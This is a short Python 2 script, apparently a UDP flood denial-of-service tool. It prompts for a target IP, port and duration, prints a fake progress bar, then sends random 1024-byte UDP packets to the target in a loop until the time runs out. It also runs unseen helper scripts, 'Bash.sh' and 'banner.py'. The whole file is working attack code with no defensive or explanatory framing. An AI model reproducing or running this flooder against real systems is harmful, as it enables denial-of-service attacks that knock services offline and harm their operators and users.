#!/usr/python

#colour codes


import os
import sys
import time
import socket
import random
os.system("bash Bash.sh")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
os.system("clear")
os.system ("python banner.py")
print("")
ip = raw_input("\033[32;1m" "Target IP : ")
port = input("\033[32;1m" "port : ")
dur = input("\033[32;1m" "Time : ")
timeout = time.time() + dur
print "[                    ] 0% "
time.sleep(2)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(4)
print "[===============     ] 75%"
time.sleep(5)
print "[====================] 100%"
time.sleep(3)
sent = 0




while True:
 
                try:

                             if time.time() > timeout:
                                            break
                             else:
                                            pass
                             sock.sendto(str(bytes),( str(ip), port))                             
                             sent = sent +1
                             print "Sent %s packets to %s through port %s"%(sent, ip, port)
                except KeyboardInterrupt:
                             sys.exit()



